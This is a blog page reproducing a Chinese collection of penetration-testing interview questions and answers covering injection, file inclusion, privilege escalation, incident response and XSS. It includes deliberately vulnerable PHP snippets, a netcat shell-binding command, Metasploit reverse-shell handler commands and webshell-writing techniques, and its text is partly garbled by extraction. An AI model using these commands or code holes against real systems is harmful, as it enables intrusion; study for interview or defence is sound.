<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Category: WEB安全 - ol4three</title><meta description="涉猎方向有渗透测试、安全研究、二进制安全、代码审计、Python、Java"><meta property="og:type" content="blog"><meta property="og:title" content="ol4three"><meta property="og:url" content="http://www.ol4three.com/"><meta property="og:site_name" content="ol4three"><meta property="og:description" content="涉猎方向有渗透测试、安全研究、二进制安全、代码审计、Python、Java"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://www.ol4three.com/img/og_image.png"><meta property="article:author" content="ol4three"><meta property="article:tag" content="渗透测试、安全研究、二进制安全、代码审计、Python、Java、C++"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://www.ol4three.com"},"headline":"ol4three","image":["http://www.ol4three.com/img/og_image.png"],"author":{"@type":"Person","name":"ol4three"},"description":"涉猎方向有渗透测试、安全研究、二进制安全、代码审计、Python、Java"}</script><link rel="icon" href="/img/logo.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><script data-ad-client="1" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="ol4three" type="application/atom+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="ol4three" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/Security%20Incidents">Security Incidents</a><a class="navbar-item" href="/Vulnerabilities">Vulnerabilities</a><a class="navbar-item" href="/Read%20Team">Read Team</a><a class="navbar-item" href="/Stop%20learning">Stop learning</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/categories">Categories</a></li><li class="is-active"><a href="#" aria-current="page">WEB安全</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/12/30/WEB/2020-%E6%9C%80%E6%96%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%BE%AF%E8%AF%95%E9%A2%98%E5%90%88%E9%9B%86/"><i class="fas fa-angle-double-right"></i>2020 最新渗透测试⾯试题合集</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-12-30</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-30T02:22:54.214Z" title="2020-12-30T02:22:54.214Z">2020-12-30</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-30</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">2 hours read (About 18295 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/12/30/WEB/2020-%E6%9C%80%E6%96%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%BE%AF%E8%AF%95%E9%A2%98%E5%90%88%E9%9B%86/">2020 最新渗透测试⾯试题合集</a></h1><div class="content"><blockquote>
<p>⽹上整理的⾯试问题⼤全，有些 HW ⾯试的题，已经收集好了，提供给⼤家。现在就是毕业季节，希望各位都能找到好⼯作。</p>
</blockquote>
<h2 id="渗透篇"><a href="#渗透篇" class="headerlink" title="渗透篇"></a>渗透篇</h2><h4 id="1、介绍⼀下⾃认为有趣的挖洞经历"><a href="#1、介绍⼀下⾃认为有趣的挖洞经历" class="headerlink" title="1、介绍⼀下⾃认为有趣的挖洞经历"></a>1、介绍⼀下⾃认为有趣的挖洞经历</h4><p>挖洞也有分很多种类型，⼀种是以渗透、⼀种是以找漏洞为主，如果是前者会想各种办法获取权限继⽽获取想要的的东 </p>
<p>⻄完成渗透⽬标，这类跟 HW 类似，⽬标各种漏洞不算，要有 Shell，服务器权限才给分，这才是最接近实战渗透，跟某 </p>
<p>部⻔有合作的话也是属于这种打击⽹络犯罪获得权限、传销数据、组织架构，服务器权限、等……</p>
<h4 id="2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"><a href="#2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？" class="headerlink" title="2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？"></a>2、你平时⽤的⽐较多的漏洞是哪些？相关漏洞的原理？以及对应漏洞的修复⽅案？</h4><p>SQL 注⼊、密码组合, 前者防护分为⼏种，CDN -&gt; Web -&gt; 数据库 -&gt; 主机, 设置最⼩权限来应对。密码组合根据个⼈ </p>
<p>习惯</p>
<h4 id="3、php-java-反序列化漏洞的原理-解决⽅案"><a href="#3、php-java-反序列化漏洞的原理-解决⽅案" class="headerlink" title="3、php/java 反序列化漏洞的原理? 解决⽅案?"></a>3、php/java 反序列化漏洞的原理? 解决⽅案?</h4><p>php 中围绕着 serialize()，unserialize() 这两个函数，序列化就是把⼀个对象变成可以传输的字符串, 如果服务器能够接 </p>
<p>收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术⽅法⾥⾯的话，就容易造成很严重的漏洞 </p>
<p>了。</p>
<p>O:7:”chybeta”:1:{s:4:”test”;s:3:”123”;} </p>
<p>这⾥的 O 代表存储的是对象（object）, 假如你给 serialize() 传⼊的是⼀个数组，那它会变成字⺟ a。7 表示对象的名称 </p>
<p>有 7 个字符。”chybeta” 表示对象的名称。1 表示有⼀个值。{s:4:”test”;s:3:”123”;} 中，s 表示字符串，4 表示该字符串的 </p>
<p>⻓度，”test” 为字符串的名称，之后的类似。当传给 unserialize() 的参数可控时，我们可以通过传⼊⼀个精⼼构造的序列 </p>
<p>化字符串 控 对象内部的变 甚 数化字符串，从⽽控制对象内部的变量甚⾄是函数。 </p>
<p>JAVA Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、⽂件、数据库中，ObjectOutputStream 类 </p>
<p>的 writeObject() ⽅法可以实现序列化。Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类 </p>
<p>的 readObject() ⽅法⽤于反序列化。 </p>
<h4 id="4、如果⼀台服务器被⼊侵后-你会如何做应急响应"><a href="#4、如果⼀台服务器被⼊侵后-你会如何做应急响应" class="headerlink" title="4、如果⼀台服务器被⼊侵后, 你会如何做应急响应?"></a>4、如果⼀台服务器被⼊侵后, 你会如何做应急响应?</h4><ol>
<li><p>准备相关的⼯具，查后⻔等⼯具 </p>
</li>
<li><p>初步判断事件类型, 事件等级。 </p>
</li>
<li><p>抑制范围，隔离使受害⾯不继续扩⼤ </p>
</li>
<li><p>查找原因，封堵攻击源。 </p>
</li>
<li><p>业务恢复正常⽔平. </p>
</li>
<li><p>总结，报告，并修复、监控 </p>
</li>
</ol>
<p>以上是常规的回答，想知道你是否有这⽅⾯应急相关的经验，像这类问题甲⽅⾯试⽐较多。 </p>
<h4 id="5、你平时使⽤哪些⼯具-以及对应⼯具的特点"><a href="#5、你平时使⽤哪些⼯具-以及对应⼯具的特点" class="headerlink" title="5、你平时使⽤哪些⼯具? 以及对应⼯具的特点?"></a>5、你平时使⽤哪些⼯具? 以及对应⼯具的特点?</h4><p>AWVS、Masscan、BurpSuite </p>
<p>AWVS 常规漏洞扫描，masscan 快速查找端⼝，burp 重复提交数据包 </p>
<p>想知道是否有⾃⼰开发⼯具，如果没有你对每个安全⼯具有哪些独特的⻅解以及别⼈不知道的技巧⽤法。如：awvs 如何 </p>
<p>批量扫描？burpsuite 如何爆破 401､脱库等、等等… </p>
<h4 id="6、如果遇到-waf-的情况下如何进⾏-sql-注⼊-上传-Webshell-怎么做？请写出曾经绕过-WAF-的经过-SQLi，XSS，"><a href="#6、如果遇到-waf-的情况下如何进⾏-sql-注⼊-上传-Webshell-怎么做？请写出曾经绕过-WAF-的经过-SQLi，XSS，" class="headerlink" title="6、如果遇到 waf 的情况下如何进⾏ sql 注⼊ / 上传 Webshell 怎么做？请写出曾经绕过 WAF 的经过 (SQLi，XSS，"></a>6、如果遇到 waf 的情况下如何进⾏ sql 注⼊ / 上传 Webshell 怎么做？请写出曾经绕过 WAF 的经过 (SQLi，XSS，</h4><p>上传漏洞选⼀)PHP 上传，⽆法上传 php、解析、后台没有办法拿到，只有⼀处点可以上传。通过 Windows 特性 shell.php::$DATA， </p>
<p>是⼀个项⽬管理系统</p>
<h4 id="7、如何判断-sql-注⼊，有哪些⽅法"><a href="#7、如何判断-sql-注⼊，有哪些⽅法" class="headerlink" title="7、如何判断 sql 注⼊，有哪些⽅法"></a>7、如何判断 sql 注⼊，有哪些⽅法</h4><p>提交错误语句是否有异常，除此之外这些显示的错误可以通过 sleep, 修眠语句执⾏ 5 秒等，除此之外通过 DNSlog 判断 </p>
<p>是还有传回值 </p>
<h4 id="8、如何判断-SQL-注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？"><a href="#8、如何判断-SQL-注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？" class="headerlink" title="8、如何判断 SQL 注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？"></a>8、如何判断 SQL 注⼊漏洞成因，如何防范？注⼊⽅式有哪些？除了数据库数据，利⽤⽅式还有哪些？</h4><p>select * from news where id = ‘$SQL’; </p>
<p>当程序执⾏访问新闻等⼀些操作都会执⾏到 sql 语句进⾏调⽤，如果在此调⽤过程中，提交了不合法的数据，⽽数据库 </p>
<p>⽆法识别则会报错。也就是⼀切输⼊都是有害的。 </p>
<p>注⼊类型有 6 种，可以参考 SQLMAP，报错、盲注、联合、时间、内联、堆叠 </p>
<p>注⼊提交⽅式：GET、POST、Cookies、⽂件头 </p>
<p>利⽤⽅式：具体看什么数据库类型，像 SQLSERVER 可以命令执⾏，MYSQL 写 shell 有些权限⼤也可以执⾏命令但是 </p>
<p>条件是在 lINUX 环境下。 </p>
<p>防范: 边界, CDN -&gt; 脚本语⾔过滤 -&gt; 数据库过滤最⼩权限 -&gt; 主机 </p>
<h4 id="9、为什么有的时候没有错误回显"><a href="#9、为什么有的时候没有错误回显" class="headerlink" title="9、为什么有的时候没有错误回显"></a>9、为什么有的时候没有错误回显</h4><p>没有进⾏错误打印或者错误屏蔽 </p>
<h4 id="10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload-如何构造？"><a href="#10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload-如何构造？" class="headerlink" title="10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload 如何构造？"></a>10、宽字符注⼊的原理？如何利⽤宽字符注⼊漏洞，payload 如何构造？</h4><p>在 mysql 中使⽤了 gbk 编码，占⽤ 2 个字节, ⽽ mysql 的⼀种特性, GBK 是多字节编码，它认为两个字节就代表⼀个汉 </p>
<p>字，所以 %df 时候会和转义符 \ %5c 进⾏结合, 所以单引号就逃逸了出来, 当第⼀个字节的 ascii 码⼤于 128，就可以了。</p>
<h4 id="11、CRLF-注⼊的原理"><a href="#11、CRLF-注⼊的原理" class="headerlink" title="11、CRLF 注⼊的原理"></a>11、CRLF 注⼊的原理</h4><p>CRLF 注⼊在 OWASP ⾥⾯被称为 HTTP 拆分攻击（HTTP Splitting）CRLF 是” 回⻋ + 换⾏”（\r\n）的简称, 在 HTTP </p>
<p>协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显 </p>
<p>示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏ </p>
<h4 id="12、mysql-的⽹站注⼊，5-0-以上和-5-0-以下有什么区别？"><a href="#12、mysql-的⽹站注⼊，5-0-以上和-5-0-以下有什么区别？" class="headerlink" title="12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？"></a>12、mysql 的⽹站注⼊，5.0 以上和 5.0 以下有什么区别？</h4><p>5.0 以下没有 information_schema 这个系统表，⽆法列表名等，只能暴⼒跑表名。 </p>
<p>5.0 以下是多⽤户单操作，5.0 以上是多⽤户多操作。 </p>
<h4 id="13、php-ini-可以设置哪些安全特性"><a href="#13、php-ini-可以设置哪些安全特性" class="headerlink" title="13、php.ini 可以设置哪些安全特性"></a>13、php.ini 可以设置哪些安全特性</h4><p>禁⽤ PHP 函数 </p>
<p>允许 include 或打开访问远程资源 </p>
<h4 id="14、php-的-00-截断的原理是什么？"><a href="#14、php-的-00-截断的原理是什么？" class="headerlink" title="14、php 的 %00 截断的原理是什么？"></a>14、php 的 %00 截断的原理是什么？</h4><p>因为在 C 语⾔中字符串的结束标识符 %00 是结束符号，⽽ PHP 就是 C 写的，所以继承了 C 的特性，所以判断为 </p>
<p>%00 是结束符号不会继续往后执⾏ </p>
<p>条件：PHP&lt;5.3.29，且 GPC 关闭 </p>
<h4 id="15、webshell-检测，有哪些⽅法"><a href="#15、webshell-检测，有哪些⽅法" class="headerlink" title="15、webshell 检测，有哪些⽅法"></a>15、webshell 检测，有哪些⽅法</h4><p>grep、关键词、关键函数 </p>
<p>安全狗、D 盾</p>
<p>的 本地包含 洞 什么 段带有 洞的代 ⼿ 的话如何发掘 如 报错 你 怎么16、php 的 LFI，本地包含漏洞原理是什么？写⼀段带有漏洞的代码。⼿⼯的话如何发掘？如果⽆报错回显，你是怎么 </p>
<p>遍历⽂件的？ </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ($_GET[&#39;fifile&#39;])&#123; </span><br><span class="line"></span><br><span class="line">include $_GET[&#39;fifile&#39;]; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>包含的⽂件设置为变量，并且⽆过滤导致可以调⽤恶意⽂件 还可以对远程⽂件包含，但需要开启 allow_url_include = </p>
<p>ON 通过测试参数的地⽅进⾏本地⽂件 / etc/passwd 等包含 如何存在漏洞⽽且没有回显，有可能没有显示在⻚⾯⽽是 </p>
<p>在⽹⻚源代码中，除了些可以利⽤ DNSlog 进⾏获取包含的信息。从 index.php ⽂件⼀级级往读取 也可以利⽤ PHP 封 </p>
<p>装协议读取⽂件 </p>
<h4 id="17、说说常⻅的中间件解析漏洞利⽤⽅式"><a href="#17、说说常⻅的中间件解析漏洞利⽤⽅式" class="headerlink" title="17、说说常⻅的中间件解析漏洞利⽤⽅式"></a>17、说说常⻅的中间件解析漏洞利⽤⽅式</h4><p>IIS 6.0</p>
<p>/xx.asp/xx.jpg “xx.asp” 是⽂件夹名 </p>
<p>IIS 7.0/7.5 </p>
<p>默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 </p>
<p>Nginx </p>
<p>版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。 </p>
<p>空字节代码 xxx.jpg%00.php </p>
<p>Apache </p>
<p>上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 </p>
<p>的 户名密 存放在 张表 密 采 种加密⽅式18、mysql 的⽤户名密码是存放在那张表⾥⾯？mysql 密码采⽤哪种加密⽅式？ </p>
<p>mysql -&gt; users </p>
<p>SHA1 </p>
<h4 id="19、Windows、Linux、数据库的加固降权思路，任选其⼀"><a href="#19、Windows、Linux、数据库的加固降权思路，任选其⼀" class="headerlink" title="19、Windows、Linux、数据库的加固降权思路，任选其⼀"></a>19、Windows、Linux、数据库的加固降权思路，任选其⼀</h4><p>禁⽤ root </p>
<p>禁⽌远程访问 </p>
<p>禁⽌写⼊</p>
<p>单独帐号 </p>
<p>禁⽌执⾏ system 等函数 </p>
<h4 id="20、你使⽤什么⼯具来判断系统是否存在后⻔"><a href="#20、你使⽤什么⼯具来判断系统是否存在后⻔" class="headerlink" title="20、你使⽤什么⼯具来判断系统是否存在后⻔"></a>20、你使⽤什么⼯具来判断系统是否存在后⻔</h4><p>Chkrootkit </p>
<p>Rkhunter </p>
<h4 id="21、如何绕过-CDN-获取⽬标⽹站真实-IP，谈谈你的思路？"><a href="#21、如何绕过-CDN-获取⽬标⽹站真实-IP，谈谈你的思路？" class="headerlink" title="21、如何绕过 CDN 获取⽬标⽹站真实 IP，谈谈你的思路？"></a>21、如何绕过 CDN 获取⽬标⽹站真实 IP，谈谈你的思路？</h4><p>类似 phpinfo、⽹站信息 </p>
<p>C 段、⼦域名</p>
<p>历史解析记录 </p>
<p>DDOSzmap 全⽹扫描识别 http 头 </p>
<p>⽹站域名管理员邮箱，注册过的域名等相关信息关联 </p>
<h4 id="22、如果给你⼀个⽹站-你的渗透测试思路是什么-在获取书⾯授权的前提下。"><a href="#22、如果给你⼀个⽹站-你的渗透测试思路是什么-在获取书⾯授权的前提下。" class="headerlink" title="22、如果给你⼀个⽹站, 你的渗透测试思路是什么? 在获取书⾯授权的前提下。"></a>22、如果给你⼀个⽹站, 你的渗透测试思路是什么? 在获取书⾯授权的前提下。</h4><p>其实这是⼀个⾮常⼤的话题，渗透⼤部分思路都是如此，⽽⾯试官是想听到你回答不⼀样的答案让⼈眼前⼀亮 如何才做 </p>
<p>到让⼈眼前⼀亮都需要看你的经验，把你实践的过程拿出来说，以及遇到什么问题如何解决，最终取得成果 渗透其它⼤ </p>
<p>同⼩异, ⽽做为渗透者知识的储备、基础扎实、耐⼼、细⼼都是必不可少。 </p>
<h4 id="23、谈⼀谈-Windows-系统与-Linux-系统提权的思路？"><a href="#23、谈⼀谈-Windows-系统与-Linux-系统提权的思路？" class="headerlink" title="23、谈⼀谈 Windows 系统与 Linux 系统提权的思路？"></a>23、谈⼀谈 Windows 系统与 Linux 系统提权的思路？</h4><p>Windows </p>
<p>Windows 服务⽐较多所以⽅法也如此，最基本的就是 Exp 提权，数据库 SQLServer、MYSQL UDF 等、第三⽅软件提 </p>
<p>权。</p>
<p>除此之外提权的成功与否和在于信息收集也⾮常重要，你对这台服务器和管理员了解多少。 </p>
<p>windows 权限提升 (⼆) </p>
<p>Linux </p>
<p>Linux 也是类似，除了 EXP 或者⾼版本的内核⽆法提权之外，通过第三⽅软件和服务，除了提权也可以考虑把这台机器 </p>
<p>当跳版, </p>
<p>达到先进⼊内⽹安全防线最弱的地⽅寻找有⽤的信息，再迂回战术。 </p>
<p>linux 权限提升 </p>
<p>Brief </p>
<p>枚举脚本以 root 权限运⾏的程序 </p>
<p>⽤户安装的软件 </p>
<p>弱⼝令或者明⽂密码 </p>
<p>只能内部访问的服务 </p>
<p>suid 和 guid 错误配置 </p>
<p>滥⽤ sudo 权限 </p>
<p>以 root 权限运⾏的脚本⽂件 </p>
<p>错误的路径配置 </p>
<p>计划任务 </p>
<p>未挂载的⽂件系统</p>
<p>NFS 共享</p>
<p>通过键盘记录仪窃取密码 </p>
<p>其它有⽤的和提权相关的东⻄ </p>
<p>内核提权 </p>
<h4 id="24、列举出您所知道的所有开源组件⾼危漏洞-⼗个以上"><a href="#24、列举出您所知道的所有开源组件⾼危漏洞-⼗个以上" class="headerlink" title="24、列举出您所知道的所有开源组件⾼危漏洞 (⼗个以上)"></a>24、列举出您所知道的所有开源组件⾼危漏洞 (⼗个以上)</h4><p>Tomcat </p>
<p>NginxApache </p>
<p>Hadhoop </p>
<p>Docker </p>
<p>Jenkins </p>
<p>Zenoss </p>
<p>Jboss </p>
<p>MongoDB </p>
<p>Redis </p>
<p>GlassFish </p>
<h4 id="25、反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？"><a href="#25、反弹-shell-的常⽤命令？⼀般常反弹哪⼀种-shell？为什么？" class="headerlink" title="25、反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？"></a>25、反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么？</h4><p>nc -lvvp 7777 -e /bin/bash </p>
<p>bash 是交互式, 否则像 useradd ⽆法执⾏交互</p>
<h4 id="26、CMD-命令⾏如何查询远程终端开放端⼝"><a href="#26、CMD-命令⾏如何查询远程终端开放端⼝" class="headerlink" title="26、CMD 命令⾏如何查询远程终端开放端⼝"></a>26、CMD 命令⾏如何查询远程终端开放端⼝</h4><p>tasklist /svc </p>
<p>netstat -ano </p>
<h4 id="27、服务器为-IIS-PHP-MySQL，发现-root-权限注⼊漏洞，讲讲你的渗透思路"><a href="#27、服务器为-IIS-PHP-MySQL，发现-root-权限注⼊漏洞，讲讲你的渗透思路" class="headerlink" title="27、服务器为 IIS+PHP+MySQL，发现 root 权限注⼊漏洞，讲讲你的渗透思路"></a>27、服务器为 IIS+PHP+MySQL，发现 root 权限注⼊漏洞，讲讲你的渗透思路</h4><p>可以读取 IIS 信息，知道路径, 如果像 WAMMP 类似构建，通过 @@datadir 知道数据库路径也可以猜测⽹站路径。或者直接写 Shell </p>
<h4 id="28、请写出-Mysql5-数据库中查询库表所有列名的语句"><a href="#28、请写出-Mysql5-数据库中查询库表所有列名的语句" class="headerlink" title="28、请写出 Mysql5 数据库中查询库表所有列名的语句"></a>28、请写出 Mysql5 数据库中查询库表所有列名的语句</h4><p>select COLUMN_NAME from information_schema.COLUMNS where table_name = ‘your_table_name’ and </p>
<p>table_schema = ‘your_db_name’; </p>
<h4 id="29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤"><a href="#29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤" class="headerlink" title="29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤"></a>29、下⾯这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利⽤</h4><p><a target="_blank" rel="noopener" href="http://www.exp.com/1.php">http://www.exp.com/1.php</a> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">$s_func &#x3D; $_GET[&#39;s_func&#39;]; </span><br><span class="line"></span><br><span class="line">$info &#x3D; $_GET[&#39;info&#39;]; </span><br><span class="line"></span><br><span class="line">$s_func($info); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码执⾏, 通过 assert 调⽤ </p>
<h4 id="30、udf-提权"><a href="#30、udf-提权" class="headerlink" title="30、udf 提权"></a>30、udf 提权</h4><p>MySQL 可以⾃定义函数, 通过⾃定义函数做到类似 xp_cmdshell 效果 </p>
<h4 id="31、SQL-头注⼊点"><a href="#31、SQL-头注⼊点" class="headerlink" title="31、SQL 头注⼊点"></a>31、SQL 头注⼊点</h4><p>UserAgent </p>
<p>Referer </p>
<p>CookieCookie </p>
<p>X-FOR-I </p>
<h4 id="32、php-中命令执⾏涉及到的函数"><a href="#32、php-中命令执⾏涉及到的函数" class="headerlink" title="32、php 中命令执⾏涉及到的函数"></a>32、php 中命令执⾏涉及到的函数</h4><p>eval() </p>
<p>assert() </p>
<p>system() </p>
<p>exec() </p>
<p>shell_exec() </p>
<h4 id="33、SSRF-漏洞的成因-防御-绕过"><a href="#33、SSRF-漏洞的成因-防御-绕过" class="headerlink" title="33、SSRF 漏洞的成因 防御 绕过"></a>33、SSRF 漏洞的成因 防御 绕过</h4><p>模拟服务器对其它资源进⾏请求 IP 探测，如果想漏洞利⽤必需要构造好 Payload 禁⽌跳转，限制协议，内外⽹限制， </p>
<p>URL 限制 针对 IP 格式 </p>
<h4 id="34、mysql-写-shell-有⼏种⽅法"><a href="#34、mysql-写-shell-有⼏种⽅法" class="headerlink" title="34、mysql 写 shell 有⼏种⽅法"></a>34、mysql 写 shell 有⼏种⽅法</h4><p>outfifile、dumpfifile、开启 log 写 webshell </p>
<h4 id="35、Metasploit-打开反向监听的命令"><a href="#35、Metasploit-打开反向监听的命令" class="headerlink" title="35、Metasploit 打开反向监听的命令"></a>35、Metasploit 打开反向监听的命令</h4><p>use exploit/multi/handler </p>
<p>set payload windows/meterpreter/reverse_tcp </p>
<h4 id="36、应急响应的步骤"><a href="#36、应急响应的步骤" class="headerlink" title="36、应急响应的步骤"></a>36、应急响应的步骤</h4><ol>
<li><p>准备已经编译好的⼯具以及取证分析等⼯具⼲净可靠放 U 盘 </p>
</li>
<li><p>初步判断事件的类型 是被⼊侵 ddos 还是其它的原因2. 初步判断事件的类型，是被⼊侵、ddos 还是其它的原因  </p>
</li>
<li><p>⾸先抑制范围、影响范围，隔离使受害⾯不继续扩⼤。 </p>
</li>
<li><p>寻找原因，封堵攻击源。 </p>
</li>
<li><p>把业务恢复⾄正常⽔平 </p>
</li>
<li><p>监控有⽆异常，报告、管理环节的⾃省和改进措施。 </p>
</li>
</ol>
<h4 id="37、有哪些反向代理的⼯具"><a href="#37、有哪些反向代理的⼯具" class="headerlink" title="37、有哪些反向代理的⼯具?"></a>37、有哪些反向代理的⼯具?</h4><p>reGeirg、EW、lcx、Ngrok、frp </p>
<h4 id="38、有什么⽐较曲折的渗透经历"><a href="#38、有什么⽐较曲折的渗透经历" class="headerlink" title="38、有什么⽐较曲折的渗透经历"></a>38、有什么⽐较曲折的渗透经历</h4><p>这个问题想知道你⼯作渗透到什么样的程度，只是简单的漏扫搬砖，还是有毅⼒坚持完成整个渗透，如：对⽬标不放 </p>
<p>弃，坚持⼀个⽉最终通过各种⼿段，曲折的过程拿下⽬标。 </p>
<h4 id="39、怎么查找域控"><a href="#39、怎么查找域控" class="headerlink" title="39、怎么查找域控"></a>39、怎么查找域控</h4><p>⽅法有很多 </p>
<p>1.通过 DNS 查询 </p>
<p>dig -t SRV _gc._tcp.lab.ropnop.com </p>
<p>dig -t SRV _ldap._tcp.lab.ropnop.com </p>
<p>dig -t SRV _kerberos._tcp.lab.ropnop.com </p>
<p>dig -t SRV _kpasswd._tcp.lab.ropnop.com </p>
<p>2.端⼝扫描 </p>
<p>域服务器都会开启 389 端⼝，所以可以通过扫描端⼝进⾏识别。 </p>
<p>3.其实很多域环境⾥，DNS 服务器就是域控制根本不需要怎么找。 </p>
<p>4.各种命令 </p>
<p>dsquery </p>
<p>net group “Domain controllers” </p>
<p>nltest /DCLIST:pentest.com </p>
<p>…… </p>
<h2 id="前端篇"><a href="#前端篇" class="headerlink" title="前端篇"></a>前端篇</h2><h4 id="1、什么是同源策略"><a href="#1、什么是同源策略" class="headerlink" title="1、什么是同源策略?"></a>1、什么是同源策略?</h4><p>源就是主机、协议、端⼝名的⼀个三元组 同源策略 (Same Origin Policy, SOP) 是 Web 应⽤程序的⼀种安全模型，被⼴ </p>
<p>泛地应⽤在处理 WEB 内容的各种客户端上，⽐如各⼤浏览器，微软的 Silverlight，Adobe 的 Flash/Acrobat 等等。 </p>
<h4 id="2、XSS-能⽤来做什么？"><a href="#2、XSS-能⽤来做什么？" class="headerlink" title="2、XSS 能⽤来做什么？"></a>2、XSS 能⽤来做什么？</h4><p>⽹络钓⻥、窃取⽤户 Cookies、弹⼴告刷流量、具备改⻚⾯信息、删除⽂章、获取客户端信息、传播蠕⾍ </p>
<h4 id="3、XSS-的三种类型，防御⽅法"><a href="#3、XSS-的三种类型，防御⽅法" class="headerlink" title="3、XSS 的三种类型，防御⽅法"></a>3、XSS 的三种类型，防御⽅法</h4><p>反射型、Dom Base XSS、存储型 防御⽅法这个只能说个⼤概，毕竟这是⼀个⽐较⼤的话题，⽽且防御的⽅法还得看所 </p>
<p>在的业务等。从⽹络层、主机层、Web 层、数据库，通过 CDN 都有过滤常⻅⼀些攻击⼿法，但不能有 CDN 就以为可</p>
<p>以了，添加 CDN 只是让攻击成本增⾼，开启 HttpOnly，以防确实存在避免 cookies 被获取，CSP 策略、再就是语⾔中 </p>
